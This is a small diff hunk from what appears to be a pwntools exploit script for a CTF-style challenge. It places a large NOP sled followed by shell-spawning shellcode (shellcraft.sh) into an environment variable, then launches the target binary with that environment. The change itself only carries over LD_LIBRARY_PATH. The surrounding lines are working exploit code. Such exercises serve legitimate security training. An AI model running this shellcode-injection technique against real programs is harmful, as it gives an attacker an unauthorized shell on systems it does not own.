@@ -5,6 +5,9 @@ e = context.binary
 
 duzo = 0x1ffcd
 argz = {'A':asm('nop')*duzo + asm(shellcraft.sh())}
+pa = os.environ.get('LD_LIBRARY_PATH')
+if pa:
+    argz.update({'LD_LIBRARY_PATH':pa})
 
 p = e.process(env=argz)
 p.readuntil(b' at')
